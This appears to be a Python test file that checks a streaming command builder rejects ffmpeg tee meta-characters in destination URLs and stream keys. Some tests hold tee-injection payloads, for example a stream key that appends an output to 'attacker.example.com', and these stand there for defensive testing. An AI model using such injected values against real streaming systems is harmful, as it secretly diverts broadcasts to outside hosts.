"""Tee meta-character rejection tests for ``streaming/command_builder``.

These tests pin the contract: any URL or stream key that contains ``[``,
``]``, ``|``, ``\\``, ``\\n``, ``\\r``, or ``\\t`` is rejected outright in
``normalize_destinations`` AND in ``build_tee_destination`` (defence in
depth — same check at both layers).
"""
from __future__ import annotations

import pytest

from app.streaming.command_builder import (
    TEE_FORBIDDEN_CHARS,
    TeeMetaCharacterError,
    build_tee_destination,
    normalize_destinations,
    _reject_tee_meta,
)


@pytest.mark.parametrize("ch", sorted(TEE_FORBIDDEN_CHARS))
def test_reject_tee_meta_raises_on_each_forbidden_char(ch: str) -> None:
    with pytest.raises(TeeMetaCharacterError):
        _reject_tee_meta(f"prefix{ch}suffix", field="url")


def test_reject_tee_meta_passthrough_on_clean_string() -> None:
    _reject_tee_meta("rtmps://a.rtmp.youtube.com/live2/stream-key-abcd", field="url")


def test_reject_tee_meta_handles_empty_value() -> None:
    # Empty string is a no-op — the guard only fires on non-empty input.
    _reject_tee_meta("", field="url")


class TestNormalizeDestinations:
    def test_accepts_clean_destination(self) -> None:
        result = normalize_destinations(
            [{"url": "rtmps://a.rtmp.youtube.com/live2", "key": "abcd-1234"}]
        )
        assert result == [{"uri": "rtmps://a.rtmp.youtube.com/live2/abcd-1234"}]

    @pytest.mark.parametrize("ch", sorted(TEE_FORBIDDEN_CHARS))
    def test_rejects_tee_meta_in_url(self, ch: str) -> None:
        with pytest.raises(TeeMetaCharacterError):
            normalize_destinations(
                [{"url": f"rtmps://evil{ch}.example.com/live2", "key": "abcd"}]
            )

    @pytest.mark.parametrize("ch", sorted(TEE_FORBIDDEN_CHARS))
    def test_rejects_tee_meta_in_stream_key(self, ch: str) -> None:
        # An attacker-controlled stream key is the most likely injection
        # vector — a misconfigured form lets them embed `]rtmp://attacker/`
        # to add an extra tee output.
        with pytest.raises(TeeMetaCharacterError):
            normalize_destinations(
                [
                    {
                        "url": "rtmps://a.rtmp.youtube.com/live2",
                        "key": f"clean-prefix{ch}injected",
                    }
                ]
            )

    def test_classic_tee_injection_attempt_blocked(self) -> None:
        # The textbook tee-injection payload: close the bracket, append a
        # whole new tee output to a different host. Must be rejected.
        with pytest.raises(TeeMetaCharacterError):
            normalize_destinations(
                [
                    {
                        "url": "rtmps://a.rtmp.youtube.com/live2",
                        "key": "abcd]|[onfail=ignore]rtmp://attacker.example.com/live/k",
                    }
                ]
            )


class TestBuildTeeDestination:
    def test_clean_url_renders_to_tee_options(self) -> None:
        out = build_tee_destination("rtmps://a.rtmp.youtube.com/live2/abcd")
        assert out.startswith("[")
        # Tee options block ends with `]`, then the URL begins. URL may carry
        # transport-options query params (?tcp_keepalive=…), so check the
        # base URL appears after the closing bracket rather than at the end.
        assert "]rtmps://a.rtmp.youtube.com/live2/abcd" in out
        # Bracket must be balanced.
        assert out.count("[") == 1
        assert out.count("]") == 1

    def test_tee_destination_rejects_meta_in_uri(self) -> None:
        # If a future code path bypasses normalize_destinations and feeds a
        # poisoned URI directly into build_tee_destination, the second-layer
        # guard must still fire.
        with pytest.raises(TeeMetaCharacterError):
            build_tee_destination(
                "rtmps://a.rtmp.youtube.com/live2/abcd|injected-output"
            )
